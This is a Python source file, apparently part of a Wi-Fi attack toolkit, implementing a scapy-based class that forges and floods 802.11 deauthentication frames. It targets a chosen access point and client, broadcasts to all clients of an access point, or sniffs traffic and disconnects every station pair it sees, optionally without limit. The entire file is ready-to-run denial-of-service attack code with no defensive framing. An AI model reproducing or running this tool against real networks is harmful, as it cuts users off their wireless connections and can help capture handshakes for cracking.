import time

from scapy.layers.dot11 import (
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    RadioTap,
)
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff

from utils import org


class Deauthenticator:
    """Class to handle deauthentication attacks on Wi-Fi networks."""

    def __init__(
        self,
        iface,
        deauth_count,
        ap,
        client,
        count,
        pull,
        verbose,
    ):
        """
        Initialise the Deauthenticator instance.

        :param iface: The network interface to use.
        :param deauth_count: The number of deauthentication packets to send.
        :param ap: The MAC address of the Access Point (AP).
        :param client: The MAC address of the client.
        :param count: The count of deauthentication packets; 0 for unlimited.
        :param pull: An instance for logging.
        :param verbose: Boolean indicating verbosity mode.
        """
        self.iface = iface
        self.deauth_count = deauth_count
        self.ap = ap
        self.client = client
        self.count = count
        self.unlimited = count == 0
        self.pull = pull
        self.verbose = verbose
        self.is_ap_available = False

    def locate_ap(self):
        """Locate the specified Access Point."""
        if not self.ap:
            self.is_ap_available = True
            return

        try:
            self.pull.info(
                "Waiting for the Access Point MAC address to receive... [30 seconds]"
            )
            sniff(
                iface=self.iface,
                prn=self.collector,
                timeout=30,
            )
        except Exception as e:
            if str(e) == "!":
                self.is_ap_available = True

    def collector(self, pkt):
        """Collect packets and confirm Access Point address."""
        if pkt.haslayer(Dot11Beacon):
            beacon_ap = pkt.getlayer(
                Dot11
            ).addr2.lower()
            if beacon_ap == self.ap:
                raise ImportError("!")

    def forge_packets(self):
        """Forge and send deauthentication packets."""
        pkt_ap_to_client = (
            RadioTap()
            / Dot11(
                addr1=self.client,
                addr2=self.ap,
                addr3=self.ap,
            )
            / Dot11Deauth(reason=7)
        )
        pkt_client_to_ap = (
            RadioTap()
            / Dot11(
                addr1=self.ap,
                addr2=self.client,
                addr3=self.client,
            )
            / Dot11Deauth(reason=7)
        )

        if self.unlimited:
            while True:
                self.send_packets(
                    pkt_ap_to_client,
                    pkt_client_to_ap,
                )
        else:
            for _ in range(self.count):
                self.send_packets(
                    pkt_ap_to_client,
                    pkt_client_to_ap,
                )

    def send_packets(
        self, pkt_ap, pkt_client
    ):
        """Send deauthentication packets to both AP and client."""
        if self.verbose:
            self.pull.up(
                f"{self.deauth_count} {self.ap.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN}{org(self.ap).org}{self.pull.END}) "
                f"{self.pull.RED}<> {self.client.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN}{org(self.client).org}{self.pull.END}) "
                f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
            )
        else:
            self.pull.up(
                f"{self.deauth_count} {self.ap.replace(':', '').upper()} "
                f"{self.pull.RED}<> {self.client.replace(':', '').upper()} "
                f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
            )

        sendp(
            pkt_ap,
            iface=self.iface,
            count=self.deauth_count,
            verbose=False,
        )
        sendp(
            pkt_client,
            iface=self.iface,
            count=self.deauth_count,
            verbose=False,
        )
        time.sleep(1)

    def flood(self):
        """Initiate deauthentication flood."""
        if self.ap and self.client:
            self.forge_packets()
        elif self.ap and not self.client:
            self.flood_ap()
        else:
            self.monitor_and_flood()

    def flood_ap(self):
        """Flood the Access Point with deauthentication packets."""
        broadcast_address = (
            "ff:ff:ff:ff:ff:ff"
        )
        pkt = (
            RadioTap()
            / Dot11(
                addr1=broadcast_address,
                addr2=self.ap,
                addr3=self.ap,
            )
            / Dot11Deauth(reason=7)
        )

        if self.unlimited:
            while True:
                self.send_broadcast(
                    pkt, broadcast_address
                )
        else:
            for _ in range(self.count):
                self.send_broadcast(
                    pkt, broadcast_address
                )

    def send_broadcast(
        self, pkt, broadcast_address
    ):
        """Send deauthentication packets in broadcast mode."""
        if self.verbose:
            self.pull.up(
                f"{self.deauth_count} {self.ap.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN}{org(self.ap).org}{self.pull.END}) "
                f"{self.pull.RED}<> {broadcast_address.replace(':', '').upper()} "
                f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
            )
        else:
            self.pull.up(
                f"{self.deauth_count} {self.ap.replace(':', '').upper()} "
                f"{self.pull.RED}<> {broadcast_address.replace(':', '').upper()} "
                f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
            )

        sendp(
            pkt,
            iface=self.iface,
            count=self.deauth_count,
            verbose=False,
        )
        time.sleep(1)

    def monitor_and_flood(self):
        """Monitor packets and flood clients with deauthentication commands."""
        sniff(
            iface=self.iface,
            prn=self.flood_silencer,
        )

    def flood_silencer(self, pkt):
        """Handle incoming packets and deauthenticate clients."""
        if (
            pkt.haslayer(Dot11)
            and pkt.getlayer(Dot11).type == 2
            and not pkt.haslayer(EAPOL)
        ):
            source_address = pkt.getlayer(
                Dot11
            ).addr2
            dest_address = pkt.getlayer(
                Dot11
            ).addr1

            if self.verbose:
                self.pull.up(
                    f"{self.deauth_count} {source_address.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN}{org(source_address).org}{self.pull.END}) "
                    f"{self.pull.RED}<> {dest_address.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN}{org(dest_address).org}{self.pull.END}) "
                    f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
                )
            else:
                self.pull.up(
                    f"{self.deauth_count} {source_address.replace(':', '').upper()} "
                    f"{self.pull.RED}<> {dest_address.replace(':', '').upper()} "
                    f"{self.pull.BLUE}[DEAUTHENTICATION]{self.pull.END}"
                )

            self.shoot(
                source_address, dest_address
            )

    def shoot(self, src, dest):
        """Send deauthentication packets between source and destination."""
        pkt_src_to_dest = (
            RadioTap()
            / Dot11(
                addr1=dest,
                addr2=src,
                addr3=src,
            )
            / Dot11Deauth(reason=7)
        )
        pkt_dest_to_src = (
            RadioTap()
            / Dot11(
                addr1=src,
                addr2=dest,
                addr3=dest,
            )
            / Dot11Deauth(reason=7)
        )

        sendp(
            pkt_src_to_dest,
            iface=self.iface,
            count=self.deauth_count,
            verbose=False,
        )
        sendp(
            pkt_dest_to_src,
            iface=self.iface,
            count=self.deauth_count,
            verbose=False,
        )
        time.sleep(1.05)
